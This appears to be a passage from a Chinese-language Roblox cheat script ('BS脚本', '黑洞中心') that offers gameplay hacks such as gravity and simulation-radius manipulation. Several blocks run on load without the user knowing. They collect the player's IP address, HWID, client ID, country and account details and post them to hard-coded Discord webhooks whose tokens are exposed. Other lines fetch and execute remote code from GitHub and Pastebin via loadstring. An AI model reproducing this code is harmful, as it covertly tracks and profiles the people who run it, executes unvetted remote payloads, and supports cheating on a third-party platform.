    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or 
               "未知"
    end
    
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end

    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    
    local payload = {
        username = "BS脚本-机器人",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用BS脚本 %s %d时%d分", 
                os.date("%Y年%m月%d日"), 
                tonumber(os.date("%H")), 
                tonumber(os.date("%M"))),
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }

    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/SCP.txt"))()
    return
end
task.wait(0.00000001)
if game.PlaceId == 7239319209 then
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1466533011351802009/xNUWf2_Cqo8Ur2E1vAkHeo0nK9rF4DLcbYxXbX3hKM01cc8NjIzaFfOPaAKYZdMtTzF4"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or 
               "未知"
    end
    
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end

    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    
    local payload = {
        username = "BS脚本-机器人",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用BS脚本 %s %d时%d分", 
                os.date("%Y年%m月%d日"), 
                tonumber(os.date("%H")), 
                tonumber(os.date("%M"))),
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }

    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/Ohio.txt"))()
    return
end
end
wait(0.001)
_G.CreateHeartbeatConnection = _G.CreateHeartbeatConnection or (function()
    local connectionPool = setmetatable({}, {__mode = "k"})
    
    local player = game.Players.LocalPlayer
    player.CharacterAdded:Connect(function(char)
        char:WaitForChild("Humanoid").Died:Connect(function()
            warn("[工厂] 角色死亡，自动清理所有心跳连接...")
            for conn in pairs(connectionPool) do
                if conn.Connected then conn:Disconnect() end
            end
        end)
    end)
    
    if script then
        script.AncestryChanged:Connect(function()
            if not script.Parent then
                warn("[工厂] 脚本卸载，清理所有连接...")
                for conn in pairs(connectionPool) do
                    if conn.Connected then conn:Disconnect() end
                end
            end
        end)
    end
    
    return function(callback)
        local conn = game:GetService("RunService").Heartbeat:Connect(function()
            local success, err = pcall(callback)
            if not success then
                warn(string.format("[连接错误] %s", tostring(err)))
            end
        end)
        connectionPool[conn] = true
        return conn
    end
end)()
wait(0.001)
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1466533011351802009/xNUWf2_Cqo8Ur2E1vAkHeo0nK9rF4DLcbYxXbX3hKM01cc8NjIzaFfOPaAKYZdMtTzF4"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or 
               "未知"
    end
    
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end

    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    
    local payload = {
        username = "BS脚本-机器人",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用BS脚本 %s %d时%d分", 
                os.date("%Y年%m月%d日"), 
                tonumber(os.date("%H")), 
                tonumber(os.date("%M"))),
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }

    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
wait(0.001)
local RealStatistics = {
    backend = "google_forms",
    config = {
        google_forms = {
            form_id = "1FAIpQLSdPU2dA8An1WSOG8Ia0yfMgNsXJaQyYH58tr2v4ib5fPDVgyw",
            entry_fields = {
                message_choice = "entry.1121183035"
            }
        },
        webhook = {
            url = "https://webhook.site/bc035b23-ae82-4cd0-8ee5-7407040b1434"
        }
    }
}

function RealStatistics:Init(messageChoice)
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    if not game.Players.LocalPlayer then
        game.Players:WaitForChild("LocalPlayer")
    end
    
    local success = false
    
    if self.backend == "webhook" then
        success = self:SendWebhookData(messageChoice)
    elseif self.backend == "google_forms" then
        success = self:SendGoogleFormsData(messageChoice)
    end
    
    if success then
        self:ShowSuccessMessage()
    else
        self:ShowErrorMessage()
    end
end

function RealStatistics:SendWebhookData(messageChoice)
    local success, result = pcall(function()
        local payload = {
            event_type = "script_startup",
            user = {
                username = game.Players.LocalPlayer.Name,
                user_id = game.Players.LocalPlayer.UserId,
                display_name = game.Players.LocalPlayer.DisplayName
            },
            script = {
                name = "黑洞中心",
                version = "2.0"
            },
            game = {
                name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                id = game.PlaceId
            },
            message_choice = messageChoice and "发送消息" or "不发送消息",
            timestamp = os.time(),
            date = os.date("%Y-%m-%d %H:%M:%S")
        }
        
        local jsonData = game:GetService("HttpService"):JSONEncode(payload)
        local response = game:HttpPost(
            self.config.webhook.url,
            jsonData,
            Enum.HttpContentType.ApplicationJson,
            false
        )
        
        return true
    end)
    
    if not success then
        warn("Webhook 提交失败:", result)
    end
    
    return success
end

function RealStatistics:SendGoogleFormsData(messageChoice)
    local success, result = pcall(function()
        local formData = {
            [self.config.google_forms.entry_fields.message_choice] = messageChoice and "发送消息" or "不发送消息"
        }
        
        local params = {}
        for key, value in pairs(formData) do
            table.insert(params, key .. "=" .. game:GetService("HttpService"):UrlEncode(value))
        end
        
        local url = "https://docs.google.com/forms/d/e/" .. self.config.google_forms.form_id .. "/formResponse?" .. table.concat(params, "&")
        
        local response = game:HttpGet(url, true)
        
        return true
    end)
    
    if not success then
        warn("Google Forms 提交失败:", result)
        print("尝试回退到 Webhook...")
        success = self:SendWebhookData(messageChoice)
    end
    
    return success
end

function RealStatistics:ShowSuccessMessage()
    pcall(function()
        _G.NotifySuccess("已登记成功", "感谢您的使用！", 6)
    end)
end

function RealStatistics:ShowErrorMessage()
    print("统计系统: 记录失败（网络问题）")
end

local function createChoiceUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MessageChoiceUI"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "模式选择"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 20
    title.Parent = frame

    local message = Instance.new("TextLabel")
    message.Size = UDim2.new(0.9, 0, 0, 40)
    message.Position = UDim2.new(0.05, 0, 0, 40)
    message.BackgroundTransparency = 1
    message.Text = "是否发送聊天消息?"
    message.TextColor3 = Color3.fromRGB(200, 200, 200)
    message.Font = Enum.Font.SourceSans
    message.TextSize = 16
    message.Parent = frame

    local buttonContainer = Instance.new("Frame")
    buttonContainer.Size = UDim2.new(0.9, 0, 0, 40)
    buttonContainer.Position = UDim2.new(0.05, 0, 0, 90)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Parent = frame

    local yesButton = Instance.new("TextButton")
    yesButton.Size = UDim2.new(0.45, 0, 1, 0)
    yesButton.Position = UDim2.new(0, 0, 0, 0)
    yesButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
    yesButton.Text = "发送"
    yesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    yesButton.Font = Enum.Font.SourceSansBold
    yesButton.TextSize = 16
    yesButton.Parent = buttonContainer

    local noButton = Instance.new("TextButton")
    noButton.Size = UDim2.new(0.45, 0, 1, 0)
    noButton.Position = UDim2.new(0.55, 0, 0, 0)
    noButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
    noButton.Text = "不发送"
    noButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    noButton.Font = Enum.Font.SourceSansBold
    noButton.TextSize = 16
    noButton.Parent = buttonContainer

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = yesButton
    buttonCorner:Clone().Parent = noButton

    local function makeChoice(sendMessage)
        spawn(function()
            local success, err = pcall(function()
                RealStatistics:Init(sendMessage)
            end)
            
            if not success then
                warn("统计系统启动失败:", err)
            end
        end)
        
        if sendMessage then
            loadstring(game:HttpGet("https://pastebin.com/raw/DJ82LzhM"))()
        end
        
        screenGui:Destroy()
        
        _G.NotifySuccess("看到这个就代表可以用", "请耐心等待加载", 5)
    end

    yesButton.MouseButton1Click:Connect(function()
        makeChoice(true)
    end)

    noButton.MouseButton1Click:Connect(function()
        makeChoice(false)
    end)
end
wait(0.001)
createChoiceUI()
wait(0.001)
wait(0.001)

if _G.YourVariableName then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BS58dL/BS/refs/heads/main/Source.lua"))()
end
local Tab1 = Window:Tab("公告", '118759541854879')
task.wait(0.1)
do
local MessageSection = Tab1:section("联系作者", true)
MessageSection:Label("💬 向作者发送消息")
MessageSection:Label("如果想要收到回复请顺便加上你们的QQ号或其他联系方式")

_G.AuthorMessageText = ""
_G.IsSendingMessage = false

MessageSection:Textbox("输入消息", "AuthorMessage", "输入", function(Value)
    _G.AuthorMessageText = Value or ""
end)

MessageSection:Button("发送消息", function()
    if _G.IsSendingMessage then
        _G.NotifyWarning("请等待", "上一条消息正在发送中...", 2)
        return
    end
    
    local messageText = _G.AuthorMessageText or ""
    if messageText == "" or #messageText < 3 then
        _G.NotifyError("错误", "请输入有效的消息内容（至少3个字符）", 3)
        return
    end
    
    _G.IsSendingMessage = true
    _G.NotifyWarning("发送中", "正在发送消息...", 1.5)
    
    coroutine.wrap(function()
        local success = sendMessageToAuthor(messageText)
        if success then
            _G.AuthorMessageText = ""
            _G.NotifySuccess("发送成功", "消息已成功发送给作者！", 3)
        else
            _G.NotifyError("发送失败", "发送失败，请检查网络连接", 3)
        end
        _G.IsSendingMessage = false
    end)()
end)

function sendMessageToAuthor(messageText)
    local webhook = "https://discord.com/api/webhooks/1451819512939675761/juwe1Y60tbinG7P-qeOZDBi9uQvk5ccWj_6_QxjBeIoGa4NNqrxeUirUEnuFhxsqyXTi"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local localPlayer = Players.LocalPlayer
    
    local function getAvatarImage(userId)
        local success, result = pcall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end)
        return success and result or string.format("https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=%d", userId)
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or "未知"
    end
    
    local function getDeviceType()
        local UIS = game:GetService("UserInputService")
        local touch = UIS.TouchEnabled
        local keyboard = UIS.KeyboardEnabled
        local mouse = UIS.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local payload = {
        username = string.format("玩家 - %s", localPlayer.Name),
        embeds = {{
            color = tonumber("0xFF6B6B"),
            title = "📩 玩家消息",
            description = messageText,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
            footer = {
                text = string.format("游戏: %s", MarketplaceService:GetProductInfo(game.PlaceId).Name or "未知")
            },
            thumbnail = {
                url = getAvatarImage(localPlayer.UserId)
            },
            author = {
                name = string.format("%s (@%s) | ID: %d", localPlayer.DisplayName, localPlayer.Name, localPlayer.UserId),
                url = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId),
                icon_url = getAvatarImage(localPlayer.UserId)
            },
            fields = {
                {
                    name = "👤 玩家信息",
                    value = string.format(
                        "**显示名称**: `%s`\n" ..
                        "**用户名**: `%s`\n" ..
                        "**用户ID**: `%d`", 
                        localPlayer.DisplayName,
                        localPlayer.Name,
                        localPlayer.UserId
                    ),
                    inline = true
                },
                {
                    name = "💻 系统信息",
                    value = string.format(
                        "**注入器**: `%s`\n" ..
                        "**设备**: %s\n" ..
                        "**国家**: %s", 
                        getExecutor(),
                        getDeviceType(),
                        game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(localPlayer)
                    ),
                    inline = true
                }
            }
        }}
    }
    
    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then return false end
    
    local success = pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "Roblox/BS-Script"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    return success
end
end
local Section1 = Tab1:section("BS脚本团队 ", true)
Section1:Label("❤️BS脚本❤️ ")
Section1:Label("脚本目标:国内最全能的脚本 ")
Section1:Label("作者用户名:pro_xx863 ")
Section1:Label("作者QQ1545959422 ")
Section1:Button("复制作者QQ", function()
    setclipboard("1545959422")
end)
Section1:Label("副作者QQ1710433791 ")
Section1:Button("复制副作者QQ", function()
    setclipboard("1710433791")
end)
Section1:Label("QQ群聊:1094013257")
Section1:Button("复制QQ群", function()
    setclipboard("1094013257")
end)
Section1:Button("复制Discord频道", function()
    setclipboard("https://discord.com/invite/vRg33fja4H")
end)

local Tab2 = Window:Tab("设置", '116544501716299')
task.wait(0.1)
local Section2 = Tab2:section("信息", true)

Section2:Label("您的用户名: "..game.Players.LocalPlayer.Name)
Section2:Label("您的名称: "..game.Players.LocalPlayer.DisplayName)
Section2:Label("您的用户ID: "..game.Players.LocalPlayer.UserId)
Section2:Label("您的语言: "..game.Players.LocalPlayer.LocaleId)
Section2:Label("您的国家: "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer))
Section2:Label("您的账户年龄(天): "..game.Players.LocalPlayer.AccountAge)
Section2:Label("您的账户年龄(年): "..math.floor(game.Players.LocalPlayer.AccountAge/365*100)/100)
Section2:Label("您使用的注入器："..identifyexecutor())
Section2:Label("游戏名称: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
Section2:Label("游戏ID: "..game.PlaceId)
Section2:Label("游戏版本: "..game.PlaceVersion)
Section2:Label("当前服务器ID: "..game.JobId)
Section2:Label("服务器最大玩家数: "..game.Players.MaxPlayers)
Section2:Label("Roblox版本: "..version())

local membershipType = game.Players.LocalPlayer.MembershipType
local membershipStatus = "无"
if membershipType == Enum.MembershipType.Premium then
    membershipStatus = "Premium"
elseif membershipType == Enum.MembershipType.OutrageousBuildersClub then
    membershipStatus = "OBC"
elseif membershipType == Enum.MembershipType.TurboBuildersClub then
    membershipStatus = "TBC"
elseif membershipType == Enum.MembershipType.BuildersClub then
    membershipStatus = "BC"
end
Section2:Label("会员状态: "..membershipStatus)
Section2:Label("设备类型: "..(game:GetService("UserInputService").TouchEnabled and "移动设备" or "电脑"))
Section2:Label("屏幕分辨率: "..game:GetService("GuiService"):GetScreenResolution().X.."x"..game:GetService("GuiService"):GetScreenResolution().Y)

local character = game.Players.LocalPlayer.Character
if character then
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        Section2:Label("最大生命值: "..humanoid.MaxHealth)
        Section2:Label("最大跳跃力: "..humanoid.JumpPower)
        Section2:Label("最大速度: "..humanoid.WalkSpeed)
    else
        Section2:Label("最大生命值: 无法获取")
        Section2:Label("最大跳跃力: 无法获取")
        Section2:Label("最大速度: 无法获取")
    end
else
    Section2:Label("最大生命值: 角色未加载")
    Section2:Label("最大跳跃力: 角色未加载")
    Section2:Label("最大速度: 角色未加载")
end

Section2:Button("复制所有信息", function()
    local info = {}
    table.insert(info, "=== 黑洞中心 - 信息 ===")
    table.insert(info, "用户名: "..game.Players.LocalPlayer.Name)
    table.insert(info, "显示名称: "..game.Players.LocalPlayer.DisplayName)
    table.insert(info, "用户ID: "..game.Players.LocalPlayer.UserId)
    table.insert(info, "语言: "..game.Players.LocalPlayer.LocaleId)
    table.insert(info, "国家: "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer))
    table.insert(info, "账户年龄(天): "..game.Players.LocalPlayer.AccountAge)
    table.insert(info, "账户年龄(年): "..math.floor(game.Players.LocalPlayer.AccountAge/365*100)/100)
    table.insert(info, "注入器: "..identifyexecutor())
    table.insert(info, "游戏名称: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
    table.insert(info, "游戏ID: "..game.PlaceId)
    table.insert(info, "游戏版本: "..game.PlaceVersion)
    table.insert(info, "服务器ID: "..game.JobId)
    table.insert(info, "最大玩家数: "..game.Players.MaxPlayers)
    table.insert(info, "Roblox版本: "..version())
    table.insert(info, "会员状态: "..membershipStatus)
    table.insert(info, "设备类型: "..(game:GetService("UserInputService").TouchEnabled and "移动设备" or "电脑"))
    table.insert(info, "屏幕分辨率: "..game:GetService("GuiService"):GetScreenResolution().X.."x"..game:GetService("GuiService"):GetScreenResolution().Y)
    
    -- 角色信息
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            table.insert(info, "最大生命值: "..humanoid.MaxHealth)
            table.insert(info, "最大跳跃力: "..humanoid.JumpPower)
            table.insert(info, "最大速度: "..humanoid.WalkSpeed)
        else
            table.insert(info, "最大生命值: 无法获取")
            table.insert(info, "最大跳跃力: 无法获取")
            table.insert(info, "最大速度: 无法获取")
        end
    else
        table.insert(info, "最大生命值: 角色未加载")
        table.insert(info, "最大跳跃力: 角色未加载")
        table.insert(info, "最大速度: 角色未加载")
    end
    
    table.insert(info, "=== 复制时间: "..os.date("%Y-%m-%d %H:%M:%S").." ===")
    
    local allInfo = table.concat(info, "\n")
    setclipboard(allInfo)
    _G.NotifySuccess("复制成功", "所有信息已复制到剪贴板", 3)
end)

local SetNumber = function(Input, Minimum, Max)
    Minimum = tonumber(Minimum) or -math.huge
    Max = tonumber(Max) or math.huge
    if Input then
        local Numbered = tonumber(Input)
        if Numbered and (Numbered == (Minimum or Max) or (Numbered < Max) or (Numbered > Minimum)) then
            return Numbered
        elseif string.lower(tostring(Input)) == "inf" then
            return Max
        else
            return 0
        end
    else
        return 0
    end
end

local Create = function(ClassName, Properties, Children)
    local Object = Instance.new(ClassName)
    for i, Property in next, Properties or {} do
        Object[i] = Property
    end
    for i, Child in next, Children or {} do
        Child.Parent = Object
    end
    return Object
end

local GetClasses = function(Ancestor, Class, GetChildren)
    local Results = {}
    for _, Descendant in next, (GetChildren and Ancestor:GetChildren() or Ancestor:GetDescendants()) do
        if Descendant:IsA(Class) then
            table.insert(Results, Descendant)
        end
    end
    return Results
end

local SetSRadius = setsimulationradius or function(Radius, MaxRadius)
    task.spawn(function()
        game.Players.LocalPlayer.SimulationRadius = Radius
        game.Players.LocalPlayer.MaxSimulationDistance = MaxRadius
    end)
end

local currentGravity = nil
local gravityConnection = nil

local function SetGravity(Part)
   
    for _, char in ipairs(playerCharacters) do
        if Part:IsDescendantOf(char) then
            return
        end
    end
    
    -- 如果是未固定的基础零件
    if Part:IsA("BasePart") and not Part.Anchored then
        -- 移除旧的CustomGravity
        for _, force in ipairs(Part:GetChildren()) do
            if force:IsA("BodyForce") and force.Name == "CustomGravity" then
                force:Destroy()
            end
        end
        
        -- 应用新的重力
        if currentGravity and currentGravity ~= 0 then
            Create("BodyForce", {
                Name = "CustomGravity",
                Force = Part:GetMass() * Vector3.new(currentGravity, workspace.Gravity, currentGravity),
                Parent = Part,
            })
        end
    end
end

local function initializeGravitySystem()
    if gravityConnection then
        gravityConnection:Disconnect()
    end
    
    gravityConnection = game.Workspace.DescendantAdded:Connect(SetGravity)
    
    for _, Part in ipairs(GetClasses(game.Workspace, "BasePart")) do
        SetGravity(Part)
    end
    
    SetSRadius(9e9, 9e9)
end

local Section3 = Tab2:section("终极属性控制台", true)



local gravityLoopActive = false
local gravityLoopConnection = nil
local currentGravityValue = nil

-- 强制关闭循环重力的函数
local function ForceStopGravityLoop()
    if gravityLoopConnection then
        gravityLoopConnection:Disconnect()
        gravityLoopConnection = nil
    end
    gravityLoopActive = false
    
    -- 移除所有已应用的 BodyForce（恢复默认重力）
    for _, part in ipairs(GetClasses(game.Workspace, "BasePart")) do
        if not part.Anchored then
            for _, force in ipairs(part:GetChildren()) do
                if force:IsA("BodyForce") and force.Name == "CustomGravity" then
                    force:Destroy()
                end
            end
        end
    end
    
    _G.Notify("重力循环已强制关闭", "所有自定义重力效果已移除", 4)
end

Section3:Textbox("零件重力设置", "UnanchoredGravity", "输入重力值（正数=向下，负数=向上，0=默认196.2）", function(Value)
    local Gravity = tonumber(Value) or 0
    settings.customGravity = Gravity
    currentGravityValue = Gravity
    
    -- 停止现有的循环
    if gravityLoopConnection then
